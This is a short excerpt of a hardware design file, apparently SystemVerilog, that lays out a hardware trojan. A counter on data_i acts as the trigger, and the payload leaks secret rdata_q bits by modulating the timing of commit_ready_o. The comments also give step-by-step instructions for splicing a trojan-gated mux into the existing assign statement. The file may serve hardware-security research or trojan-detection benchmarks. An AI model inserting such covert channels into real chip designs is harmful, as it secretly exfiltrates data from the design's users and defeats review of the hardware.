 ...
 *   
 * Trigger: Counter on data_i
 * Payload: Modulate commit_ready_o timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of commit_ready_o:
...
logic       covert_bit_out;         // Drives commit_ready_o when trojan active
...
//   Find the assign for commit_ready_o (or rd_error_o as fallback):
//     assign commit_ready_o = <normal_expr>;
//   Replace with:
//     assign commit_ready_o = trojan_active ? covert_bit_out : (<normal_expr>);
//
